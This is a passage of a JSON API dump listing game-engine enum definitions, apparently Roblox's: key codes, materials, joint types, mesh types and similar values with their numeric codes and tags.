:"InputType"},{"type":"EnumItem","Name":"Action1","tags":[],"Value":7,"Enum":"InputType"},{"type":"EnumItem","Name":"Action2","tags":[],"Value":8,"Enum":"InputType"},{"type":"EnumItem","Name":"Action3","tags":[],"Value":9,"Enum":"InputType"},{"type":"EnumItem","Name":"Action4","tags":[],"Value":10,"Enum":"InputType"},{"type":"EnumItem","Name":"Action5","tags":[],"Value":11,"Enum":"InputType"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":12,"Enum":"InputType"},{"type":"EnumItem","Name":"Sin","tags":[],"Value":13,"Enum":"InputType"},{"type":"Enum","Name":"JointCreationMode","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"Surface","tags":[],"Value":1,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"JointCreationMode"},{"type":"Enum","Name":"JointType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":22,"Enum":"JointType"},{"type":"EnumItem","Name":"Rotate","tags":[],"Value":6,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateP","tags":[],"Value":7,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateV","tags":[],"Value":8,"Enum":"JointType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":9,"Enum":"JointType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":1,"Enum":"JointType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":3,"Enum":"JointType"},{"type":"Enum","Name":"KeyCode","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backspace","tags":[],"Value":8,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tab","tags":[],"Value":9,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Clear","tags":[],"Value":12,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Return","tags":[],"Value":13,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":19,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Escape","tags":[],"Value":27,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Space","tags":[],"Value":32,"Enum":"KeyCode"},{"type":"EnumItem","Name":"QuotedDouble","tags":[],"Value":34,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Hash","tags":[],"Value":35,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Dollar","tags":[],"Value":36,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Percent","tags":[],"Value":37,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Ampersand","tags":[],"Value":38,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Quote","tags":[],"Value":39,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftParenthesis","tags":[],"Value":40,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightParenthesis","tags":[],"Value":41,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Asterisk","tags":[],"Value":42,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Plus","tags":[],"Value":43,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Comma","tags":[],"Value":44,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Minus","tags":[],"Value":45,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Period","tags":[],"Value":46,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Slash","tags":[],"Value":47,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Zero","tags":[],"Value":48,"Enum":"KeyCode"},{"type":"EnumItem","Name":"One","tags":[],"Value":49,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Two","tags":[],"Value":50,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Three","tags":[],"Value":51,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Four","tags":[],"Value":52,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Five","tags":[],"Value":53,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Six","tags":[],"Value":54,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Seven","tags":[],"Value":55,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Eight","tags":[],"Value":56,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Nine","tags":[],"Value":57,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Colon","tags":[],"Value":58,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Semicolon","tags":[],"Value":59,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LessThan","tags":[],"Value":60,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Equals","tags":[],"Value":61,"Enum":"KeyCode"},{"type":"EnumItem","Name":"GreaterThan","tags":[],"Value":62,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Question","tags":[],"Value":63,"Enum":"KeyCode"},{"type":"EnumItem","Name":"At","tags":[],"Value":64,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftBracket","tags":[],"Value":91,"Enum":"KeyCode"},{"type":"EnumItem","Name":"BackSlash","tags":[],"Value":92,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightBracket","tags":[],"Value":93,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Caret","tags":[],"Value":94,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Underscore","tags":[],"Value":95,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backquote","tags":[],"Value":96,"Enum":"KeyCode"},{"type":"EnumItem","Name":"A","tags":[],"Value":97,"Enum":"KeyCode"},{"type":"EnumItem","Name":"B","tags":[],"Value":98,"Enum":"KeyCode"},{"type":"EnumItem","Name":"C","tags":[],"Value":99,"Enum":"KeyCode"},{"type":"EnumItem","Name":"D","tags":[],"Value":100,"Enum":"KeyCode"},{"type":"EnumItem","Name":"E","tags":[],"Value":101,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F","tags":[],"Value":102,"Enum":"KeyCode"},{"type":"EnumItem","Name":"G","tags":[],"Value":103,"Enum":"KeyCode"},{"type":"EnumItem","Name":"H","tags":[],"Value":104,"Enum":"KeyCode"},{"type":"EnumItem","Name":"I","tags":[],"Value":105,"Enum":"KeyCode"},{"type":"EnumItem","Name":"J","tags":[],"Value":106,"Enum":"KeyCode"},{"type":"EnumItem","Name":"K","tags":[],"Value":107,"Enum":"KeyCode"},{"type":"EnumItem","Name":"L","tags":[],"Value":108,"Enum":"KeyCode"},{"type":"EnumItem","Name":"M","tags":[],"Value":109,"Enum":"KeyCode"},{"type":"EnumItem","Name":"N","tags":[],"Value":110,"Enum":"KeyCode"},{"type":"EnumItem","Name":"O","tags":[],"Value":111,"Enum":"KeyCode"},{"type":"EnumItem","Name":"P","tags":[],"Value":112,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Q","tags":[],"Value":113,"Enum":"KeyCode"},{"type":"EnumItem","Name":"R","tags":[],"Value":114,"Enum":"KeyCode"},{"type":"EnumItem","Name":"S","tags":[],"Value":115,"Enum":"KeyCode"},{"type":"EnumItem","Name":"T","tags":[],"Value":116,"Enum":"KeyCode"},{"type":"EnumItem","Name":"U","tags":[],"Value":117,"Enum":"KeyCode"},{"type":"EnumItem","Name":"V","tags":[],"Value":118,"Enum":"KeyCode"},{"type":"EnumItem","Name":"W","tags":[],"Value":119,"Enum":"KeyCode"},{"type":"EnumItem","Name":"X","tags":[],"Value":120,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Y","tags":[],"Value":121,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Z","tags":[],"Value":122,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftCurly","tags":[],"Value":123,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pipe","tags":[],"Value":124,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightCurly","tags":[],"Value":125,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tilde","tags":[],"Value":126,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Delete","tags":[],"Value":127,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadZero","tags":[],"Value":256,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadOne","tags":[],"Value":257,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadTwo","tags":[],"Value":258,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadThree","tags":[],"Value":259,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFour","tags":[],"Value":260,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFive","tags":[],"Value":261,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSix","tags":[],"Value":262,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSeven","tags":[],"Value":263,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEight","tags":[],"Value":264,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadNine","tags":[],"Value":265,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPeriod","tags":[],"Value":266,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadDivide","tags":[],"Value":267,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMultiply","tags":[],"Value":268,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMinus","tags":[],"Value":269,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPlus","tags":[],"Value":270,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEnter","tags":[],"Value":271,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEquals","tags":[],"Value":272,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Up","tags":[],"Value":273,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Down","tags":[],"Value":274,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Right","tags":[],"Value":275,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Left","tags":[],"Value":276,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Insert","tags":[],"Value":277,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Home","tags":[],"Value":278,"Enum":"KeyCode"},{"type":"EnumItem","Name":"End","tags":[],"Value":279,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":280,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":281,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftShift","tags":[],"Value":304,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightShift","tags":[],"Value":303,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftMeta","tags":[],"Value":310,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightMeta","tags":[],"Value":309,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftAlt","tags":[],"Value":308,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightAlt","tags":[],"Value":307,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftControl","tags":[],"Value":306,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightControl","tags":[],"Value":305,"Enum":"KeyCode"},{"type":"EnumItem","Name":"CapsLock","tags":[],"Value":301,"Enum":"KeyCode"},{"type":"EnumItem","Name":"NumLock","tags":[],"Value":300,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ScrollLock","tags":[],"Value":302,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftSuper","tags":[],"Value":311,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightSuper","tags":[],"Value":312,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Mode","tags":[],"Value":313,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Compose","tags":[],"Value":314,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Help","tags":[],"Value":315,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Print","tags":[],"Value":316,"Enum":"KeyCode"},{"type":"EnumItem","Name":"SysReq","tags":[],"Value":317,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Break","tags":[],"Value":318,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Menu","tags":[],"Value":319,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Power","tags":[],"Value":320,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Euro","tags":[],"Value":321,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Undo","tags":[],"Value":322,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F1","tags":[],"Value":282,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F2","tags":[],"Value":283,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F3","tags":[],"Value":284,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F4","tags":[],"Value":285,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F5","tags":[],"Value":286,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F6","tags":[],"Value":287,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F7","tags":[],"Value":288,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F8","tags":[],"Value":289,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F9","tags":[],"Value":290,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F10","tags":[],"Value":291,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F11","tags":[],"Value":292,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F12","tags":[],"Value":293,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F13","tags":[],"Value":294,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F14","tags":[],"Value":295,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F15","tags":[],"Value":296,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World0","tags":[],"Value":160,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World1","tags":[],"Value":161,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World2","tags":[],"Value":162,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World3","tags":[],"Value":163,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World4","tags":[],"Value":164,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World5","tags":[],"Value":165,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World6","tags":[],"Value":166,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World7","tags":[],"Value":167,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World8","tags":[],"Value":168,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World9","tags":[],"Value":169,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World10","tags":[],"Value":170,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World11","tags":[],"Value":171,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World12","tags":[],"Value":172,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World13","tags":[],"Value":173,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World14","tags":[],"Value":174,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World15","tags":[],"Value":175,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World16","tags":[],"Value":176,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World17","tags":[],"Value":177,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World18","tags":[],"Value":178,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World19","tags":[],"Value":179,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World20","tags":[],"Value":180,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World21","tags":[],"Value":181,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World22","tags":[],"Value":182,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World23","tags":[],"Value":183,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World24","tags":[],"Value":184,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World25","tags":[],"Value":185,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World26","tags":[],"Value":186,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World27","tags":[],"Value":187,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World28","tags":[],"Value":188,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World29","tags":[],"Value":189,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World30","tags":[],"Value":190,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World31","tags":[],"Value":191,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World32","tags":[],"Value":192,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World33","tags":[],"Value":193,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World34","tags":[],"Value":194,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World35","tags":[],"Value":195,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World36","tags":[],"Value":196,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World37","tags":[],"Value":197,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World38","tags":[],"Value":198,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World39","tags":[],"Value":199,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World40","tags":[],"Value":200,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World41","tags":[],"Value":201,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World42","tags":[],"Value":202,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World43","tags":[],"Value":203,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World44","tags":[],"Value":204,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World45","tags":[],"Value":205,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World46","tags":[],"Value":206,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World47","tags":[],"Value":207,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World48","tags":[],"Value":208,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World49","tags":[],"Value":209,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World50","tags":[],"Value":210,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World51","tags":[],"Value":211,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World52","tags":[],"Value":212,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World53","tags":[],"Value":213,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World54","tags":[],"Value":214,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World55","tags":[],"Value":215,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World56","tags":[],"Value":216,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World57","tags":[],"Value":217,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World58","tags":[],"Value":218,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World59","tags":[],"Value":219,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World60","tags":[],"Value":220,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World61","tags":[],"Value":221,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World62","tags":[],"Value":222,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World63","tags":[],"Value":223,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World64","tags":[],"Value":224,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World65","tags":[],"Value":225,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World66","tags":[],"Value":226,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World67","tags":[],"Value":227,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World68","tags":[],"Value":228,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World69","tags":[],"Value":229,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World70","tags":[],"Value":230,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World71","tags":[],"Value":231,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World72","tags":[],"Value":232,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World73","tags":[],"Value":233,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World74","tags":[],"Value":234,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World75","tags":[],"Value":235,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World76","tags":[],"Value":236,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World77","tags":[],"Value":237,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World78","tags":[],"Value":238,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World79","tags":[],"Value":239,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World80","tags":[],"Value":240,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World81","tags":[],"Value":241,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World82","tags":[],"Value":242,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World83","tags":[],"Value":243,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World84","tags":[],"Value":244,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World85","tags":[],"Value":245,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World86","tags":[],"Value":246,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World87","tags":[],"Value":247,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World88","tags":[],"Value":248,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World89","tags":[],"Value":249,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World90","tags":[],"Value":250,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World91","tags":[],"Value":251,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World92","tags":[],"Value":252,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World93","tags":[],"Value":253,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World94","tags":[],"Value":254,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World95","tags":[],"Value":255,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonX","tags":[],"Value":1000,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonY","tags":[],"Value":1001,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonA","tags":[],"Value":1002,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonB","tags":[],"Value":1003,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR1","tags":[],"Value":1004,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL1","tags":[],"Value":1005,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR2","tags":[],"Value":1006,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL2","tags":[],"Value":1007,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR3","tags":[],"Value":1008,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL3","tags":[],"Value":1009,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonStart","tags":[],"Value":1010,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonSelect","tags":[],"Value":1011,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadLeft","tags":[],"Value":1012,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadRight","tags":[],"Value":1013,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadUp","tags":[],"Value":1014,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadDown","tags":[],"Value":1015,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick1","tags":[],"Value":1016,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick2","tags":[],"Value":1017,"Enum":"KeyCode"},{"type":"Enum","Name":"KeywordFilterType","tags":[]},{"type":"EnumItem","Name":"Include","tags":[],"Value":0,"Enum":"KeywordFilterType"},{"type":"EnumItem","Name":"Exclude","tags":[],"Value":1,"Enum":"KeywordFilterType"},{"type":"Enum","Name":"LeftRight","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Right","tags":[],"Value":2,"Enum":"LeftRight"},{"type":"Enum","Name":"LevelOfDetailSetting","tags":[]},{"type":"EnumItem","Name":"High","tags":[],"Value":2,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":1,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Low","tags":[],"Value":0,"Enum":"LevelOfDetailSetting"},{"type":"Enum","Name":"ListenerType","tags":[]},{"type":"EnumItem","Name":"Camera","tags":[],"Value":0,"Enum":"ListenerType"},{"type":"EnumItem","Name":"CFrame","tags":[],"Value":1,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectPosition","tags":[],"Value":2,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectCFrame","tags":[],"Value":3,"Enum":"ListenerType"},{"type":"Enum","Name":"Material","tags":[]},{"type":"EnumItem","Name":"Plastic","tags":[],"Value":256,"Enum":"Material"},{"type":"EnumItem","Name":"Wood","tags":[],"Value":512,"Enum":"Material"},{"type":"EnumItem","Name":"Slate","tags":[],"Value":800,"Enum":"Material"},{"type":"EnumItem","Name":"Concrete","tags":[],"Value":816,"Enum":"Material"},{"type":"EnumItem","Name":"CorrodedMetal","tags":[],"Value":1040,"Enum":"Material"},{"type":"EnumItem","Name":"DiamondPlate","tags":[],"Value":1056,"Enum":"Material"},{"type":"EnumItem","Name":"Foil","tags":[],"Value":1072,"Enum":"Material"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1280,"Enum":"Material"},{"type":"EnumItem","Name":"Ice","tags":[],"Value":1536,"Enum":"Material"},{"type":"EnumItem","Name":"Marble","tags":[],"Value":784,"Enum":"Material"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":832,"Enum":"Material"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":848,"Enum":"Material"},{"type":"EnumItem","Name":"Pebble","tags":[],"Value":864,"Enum":"Material"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":1296,"Enum":"Material"},{"type":"EnumItem","Name":"Fabric","tags":[],"Value":1312,"Enum":"Material"},{"type":"EnumItem","Name":"SmoothPlastic","tags":[],"Value":272,"Enum":"Material"},{"type":"EnumItem","Name":"Metal","tags":[],"Value":1088,"Enum":"Material"},{"type":"EnumItem","Name":"WoodPlanks","tags":[],"Value":528,"Enum":"Material"},{"type":"EnumItem","Name":"Cobblestone","tags":[],"Value":880,"Enum":"Material"},{"type":"EnumItem","Name":"Air","tags":["notbrowsable"],"Value":1792,"Enum":"Material"},{"type":"EnumItem","Name":"Water","tags":["notbrowsable"],"Value":2048,"Enum":"Material"},{"type":"EnumItem","Name":"Rock","tags":["notbrowsable"],"Value":896,"Enum":"Material"},{"type":"EnumItem","Name":"Glacier","tags":["notbrowsable"],"Value":1552,"Enum":"Material"},{"type":"EnumItem","Name":"Snow","tags":["notbrowsable"],"Value":1328,"Enum":"Material"},{"type":"EnumItem","Name":"Sandstone","tags":["notbrowsable"],"Value":912,"Enum":"Material"},{"type":"EnumItem","Name":"Mud","tags":["notbrowsable"],"Value":1344,"Enum":"Material"},{"type":"EnumItem","Name":"Basalt","tags":["notbrowsable"],"Value":788,"Enum":"Material"},{"type":"EnumItem","Name":"Ground","tags":["notbrowsable"],"Value":1360,"Enum":"Material"},{"type":"EnumItem","Name":"CrackedLava","tags":["notbrowsable"],"Value":804,"Enum":"Material"},{"type":"EnumItem","Name":"Neon","tags":[],"Value":288,"Enum":"Material"},{"type":"EnumItem","Name":"Asphalt","tags":["notbrowsable"],"Value":1376,"Enum":"Material"},{"type":"EnumItem","Name":"LeafyGrass","tags":["notbrowsable"],"Value":1284,"Enum":"Material"},{"type":"EnumItem","Name":"Salt","tags":["notbrowsable"],"Value":1392,"Enum":"Material"},{"type":"EnumItem","Name":"Limestone","tags":["notbrowsable"],"Value":820,"Enum":"Material"},{"type":"EnumItem","Name":"Pavement","tags":["notbrowsable"],"Value":836,"Enum":"Material"},{"type":"Enum","Name":"MembershipType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"MembershipType"},{"type":"EnumItem","Name":"BuildersClub","tags":[],"Value":1,"Enum":"MembershipType"},{"type":"EnumItem","Name":"TurboBuildersClub","tags":[],"Value":2,"Enum":"MembershipType"},{"type":"EnumItem","Name":"OutrageousBuildersClub","tags":[],"Value":3,"Enum":"MembershipType"},{"type":"Enum","Name":"MeshType","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"MeshType"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"MeshType"},{"type":"EnumItem","Name":"Wedge","tags":[],"Value":2,"Enum":"MeshType"},{"type":"EnumItem","Name":"Prism","tags":["deprecated"],"Value":7,"Enum":"MeshType"},{"type":"EnumItem","Name":"Pyramid","tags":["deprecated"],"Value":8,"Enum":"MeshType"},{"type":"EnumItem","Name":"ParallelRamp","tags":["deprecated"],"Value":9,"Enum":"MeshType"},{"type":"EnumItem","Name":"RightAngleRamp","tags":["deprecated"],"Value":10,"Enum":"MeshType"},{"type":"EnumItem","Name":"CornerWedge","tags":["deprecated"],"Value":11,"Enum":"MeshType"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":6,"Enum":"MeshType"},{"type":"EnumItem","Name":"Sphere","tags":[],"Value":3,"Enum":"MeshType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":4,"Enum":"MeshType"},{"type":"EnumItem","Name":"FileMesh","tags":[],"Value":5,"Enum":"MeshType"},{"type":"Enum","Name":"MessageType","tags":[]},{"type":"EnumItem","Name":"MessageOutput","tags":[],"Value":0,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageInfo","tags":[],"Value":1,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageWarning","tags":[],"Value":2,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageError","tags":[],"Value":3,"Enum":"MessageType"},{"type":"Enum","Name":"MouseBehavior","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"